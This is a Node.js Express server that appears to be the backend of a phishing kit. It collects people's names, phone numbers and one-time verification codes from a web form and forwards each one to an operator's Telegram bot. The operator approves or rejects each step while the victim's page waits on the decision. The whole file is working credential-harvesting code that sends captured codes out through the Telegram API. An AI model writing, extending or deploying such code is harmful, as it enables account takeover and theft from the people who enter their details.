require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// ---------------- BACKEND DOMAIN ----------------
const BACKEND_DOMAIN = 'https://sendwave-9mid.onrender.com';

// ---------------- MEMORY STORE ----------------
const approvedPhones = {};
const approvedCodes = {};
const requestBotMap = {};

// ---------------- BOT LOADING ----------------
const bots = [];

Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (match) {
        const id = `bot${match[1]}`;
        const token = process.env[key];
        const chatId = process.env[`BOT${match[1]}_CHATID`];

        if (token && chatId) {
            bots.push({ botId: id, botToken: token, chatId });
        }
    }
});

console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

async function sendTelegramMessage(bot, text, keyboard = []) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
            {
                chat_id: bot.chatId,
                text,
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (err) {
        console.error("Telegram error:", err.message);
    }
}

async function answerCallback(bot, id) {
    try {
        await axios.post(
            `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
            { callback_query_id: id }
        );
    } catch (err) {
        console.error("Callback error:", err.message);
    }
}

// ---------------- WEBHOOK SETUP ----------------
async function setWebhook(bot) {
    const url = `${BACKEND_DOMAIN}/telegram-webhook/${bot.botId}`;

    try {
        await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${url}`
        );
        console.log(`Webhook set: ${bot.botId}`);
    } catch (err) {
        console.error("Webhook error:", err.message);
    }
}

async function initWebhooks() {
    for (const bot of bots) {
        await setWebhook(bot);
    }
    console.log("✅ All webhooks initialized");
}

// ---------------- PHONE FLOW ----------------
app.post('/submit-phone', (req, res) => {
    const { name, phone, botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();

    approvedPhones[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(
        bot,
        `📱 PHONE REQUEST\n\nName: ${name}\nPhone: ${phone}`,
        [[
            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
            { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-phone/:requestId', (req, res) => {
    res.json({
        approved: approvedPhones[req.params.requestId] ?? null
    });
});

// ---------------- CODE FLOW ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;

    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();

    approvedCodes[requestId] = null;
    requestBotMap[requestId] = botId;

    sendTelegramMessage(
        bot,
        `🔑 CODE REQUEST\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Approve', callback_data: `code_ok:${requestId}` },
            { text: '❌ Reject', callback_data: `code_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    res.json({
        approved: approvedCodes[req.params.requestId] ?? null
    });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.sendStatus(404);

    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');

    if (!requestId) {
        console.log("❌ Missing requestId in callback:", cb.data);
        return res.sendStatus(200);
    }

    let message = '';

    if (action === 'phone_ok') {
        approvedPhones[requestId] = true;
        message = `Phone approved`;
    }

    if (action === 'phone_bad') {
        approvedPhones[requestId] = false;
        message = `Phone rejected`;
    }

    if (action === 'code_ok') {
        approvedCodes[requestId] = true;
        message = `Code approved`;
    }

    if (action === 'code_bad') {
        approvedCodes[requestId] = false;
        message = `Code rejected`;
    }

    if (message) {
        await sendTelegramMessage(bot, message);
    }

    await answerCallback(bot, cb.id);

    res.sendStatus(200);
});

// ---------------- DEBUG ----------------
app.get('/debug/phones', (req, res) => res.json(approvedPhones));
app.get('/debug/codes', (req, res) => res.json(approvedCodes));

// ---------------- START SERVER ----------------
initWebhooks().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Server running on ${PORT}`);
    });
});